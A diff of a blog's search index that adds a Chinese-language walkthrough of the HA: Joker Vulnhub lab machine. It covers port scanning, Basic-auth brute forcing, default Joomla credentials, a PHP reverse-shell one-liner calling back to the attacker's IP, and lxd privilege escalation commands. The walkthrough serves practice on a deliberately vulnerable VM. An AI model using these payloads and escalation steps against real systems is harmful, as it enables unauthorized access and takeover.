@@ -1219,6 +1219,12 @@
 <p>提权成功，flag 在 root 目录下的隐藏文件中，最后访问 &#x2F;006-final&#x2F;xvf7-flag&#x2F;目录还有一个小彩蛋（）</p>
 <p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260123/KoOC/1441X695/assets/network-asset-1740904824157-8c0149e8-90f6-430b-af93-bde7d6bde06e-20250302164737-rbzbzxe.png"></p>
 ]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+      </tags>
   </entry>
   <entry>
     <title>DVWA靶场通关</title>
@@ -4841,6 +4847,68 @@ flag为这些答案总和的md5（以<a href="https://cyberchef.org/%E7%BD%91%E7
       </categories>
       <tags>
         <tag>取证应急</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HA_Joker</title>
+    <url>/2025/07/25/HA_Joker/</url>
+    <content><![CDATA[<h1 id="HA-Joker"><a href="#HA-Joker" class="headerlink" title="HA: Joker"></a>HA: Joker</h1><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>vulnhub 下载此靶机，下载地址如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">https://www.vulnhub.com/entry/ha-joker,379/<br></code></pre></td></tr></table></figure>
+
+<p>将靶机设置为 NAT 模式，开机即可，配置说明如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">攻击机ip：192.168.52.128<br>靶机ip：192.168.52.138<br></code></pre></td></tr></table></figure>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先使用 Nmap 的 Ping 扫描快速发现活跃主机，发现靶机 ip 为 192.168.52.138</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -sP 192.168.52.0/24<br></code></pre></td></tr></table></figure>
+
+<p>使用 Nmap 全面扫一下开放的端口和运行的服务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -sS -A -p1-65535 -T4 -O -sV 192.168.52.138<br></code></pre></td></tr></table></figure>
+
+<p>扫描结果如下：系统开放了两个 HTTP 服务（80 端口和 8080 端口）、一个 SSH 服务（22 端口）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-title: HA: Joker<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>8080/tcp open  http    Apache httpd 2.4.29<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: 401 Unauthorized<br>| http-auth: <br>| HTTP/1.1 401 Unauthorized\x0D<br>|_  Basic realm=Please enter the password.<br></code></pre></td></tr></table></figure>
+
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>首先访问 80 端口的 web 服务，主界面没啥有用的信息，使用 dirsearch 扫一下目录，扫到两个路径，&#x2F;phpinfo.php 和 &#x2F;secret.txt</p>
+<p>phpinfo.php 没啥有用的信息，secret.txt 内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">Batman hits Joker.<br>Joker: &quot;Bats you may be a rock but you won&#x27;t break me.&quot; (Laughs!)<br>Batman: &quot;I will break you with this rock. You made a mistake now.&quot;<br>Joker: &quot;This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock.&quot;<br>Joker: &quot;HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!&quot;<br></code></pre></td></tr></table></figure>
+
+<h2 id="账密爆破"><a href="#账密爆破" class="headerlink" title="账密爆破"></a>账密爆破</h2><p>访问 8080 端口，需要登陆，根据 secret.txt 的内容，要用 rockyou 字典去爆破用户名为 joker 的密码</p>
+<p>bp 抓包，发现网站通过 Authorization 请求头进行认证，同时传输一个 base64 编码的 账号:密码，我们按照同样的格式进行爆破（先加个 joker: 前缀，再 base64 编码）</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260123/DaW3/1468X403/assets/network-asset-1738398150025-bf15c26a-4881-404b-b4dd-71f9f0cf0184-20250523103249-ayqim4n.png"></p>
+<p>爆破完后按照长度排序找到不同的回显，将 payload 解码即可得到正确的账号密码 joker:hannah</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260123/zd73/1868X1286/assets/network-asset-1738398264846-c54f1e55-8295-4451-a78e-bde38f855aac-20250523103249-c174ilp.png"></p>
+<h2 id="框架弱口令"><a href="#框架弱口令" class="headerlink" title="框架弱口令"></a>框架弱口令</h2><p>登陆后发现是 Joomla 框架，Joomla 框架的网页在登录的时候会有一个超级管理员的默认账号密码是 joomla&#x2F;joomla，尝试使用弱口令成功登录</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260123/5Rvz/1464X877/assets/network-asset-1738399237492-89e128b3-ab3a-43a9-a711-0014e3f7aa25-20250523103249-qcc8q93.png"></p>
+<p>登陆后只有一个正常的界面，没有明显的功能入口。使用 dirsearch 进行目录扫描，由于网站使用了 Basic 认证机制，扫描时需要添加认证信息。扫描命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python dirsearch.py --auth-type=basic --auth=joker:hannah -u http://192.168.52.129:8080/<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260123/gAug/1784X920/assets/network-asset-1738399548082-d63ffbf4-545b-45cc-874c-427a58895049-20250523103249-brc6x8y.png"></p>
+<p>扫到一个 &#x2F;administrator&#x2F; 路由，访问是后台登陆界面，再次使用默认账号密码 joomla&#x2F;joomla 登陆，进入后台</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="插件命令执行"><a href="#插件命令执行" class="headerlink" title="插件命令执行"></a>插件命令执行</h2><p>后台 Extensions -&gt; Templates -&gt; Templates 处有两个插件，可以选择一个查看源码并编辑，在插件根目录写一个反弹 shell 的命令，php 反弹 shell 命令如下，命名为 shell.php 并保存</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.52.128/2233 0&gt;&amp;1&#x27;&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>访问插件所在地址，地址如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">http://192.168.52.138:8080/templates/protostar/shell.php<br></code></pre></td></tr></table></figure>
+
+<p>攻击机开启监听，拿到网站 shell</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260123/Oeda/1564X491/assets/network-asset-1747964387900-c598b1e0-135a-4e78-ae2b-83c91c518a1f-20250523103249-z32vz4r.png"></p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>id 命令发现用户处于 lxd 组中，尝试进行 lxd 提权</p>
+<p>首先本机下载 Alpine 镜像，地址如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">https://github.com/saghul/lxd-alpine-builder<br></code></pre></td></tr></table></figure>
+
+<p>下载后在 lxd-alpine-builder 目录中有 alpine-v3.13-x86_64-20210218_0139.tar.gz，如果没有就自行编译，然后在当前目录使用 python 开一个 http 服务，让靶机下载该镜像文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python -m http.server 6666  <span class="hljs-comment"># 本地启动HTTP服务</span><br><br>wget http://192.168.52.128:6666/alpine-v3.13-x86_64-20210218_0139.tar.gz  <span class="hljs-comment"># 目标主机下载</span><br></code></pre></td></tr></table></figure>
+
+<p>下载后依次使用如下命令导入镜像、创建容器、挂载宿主机根目录并进入容器</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="hljs-built_in">alias</span> myimage    <span class="hljs-comment"># 导入镜像</span><br>lxc init myimage <span class="hljs-built_in">test</span> -c security.privileged=<span class="hljs-literal">true</span>    <span class="hljs-comment"># 创建特权容器（容器名 test，基于镜像 myimage）</span><br>lxc config device add <span class="hljs-built_in">test</span> shellroot disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span>    <span class="hljs-comment"># 挂载宿主机根目录（设备名 shellroot）</span><br>lxc start <span class="hljs-built_in">test</span>    <span class="hljs-comment"># 启动容器</span><br>lxc <span class="hljs-built_in">exec</span> <span class="hljs-built_in">test</span> /bin/sh    <span class="hljs-comment"># 进入容器Shell</span><br></code></pre></td></tr></table></figure>
+
+<p>这里的 &#x2F;mnt&#x2F;root&#x2F; 就是靶机的根目录，可以查看任意文件，在 root 目录下发现 final.txt</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260123/nXBa/1570X758/assets/network-asset-1747966639714-f94f99ad-fd9d-4ec2-8008-6215f8fc0c79-20250523103250-904kx6j.png"></p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
       </tags>
   </entry>
 </search>
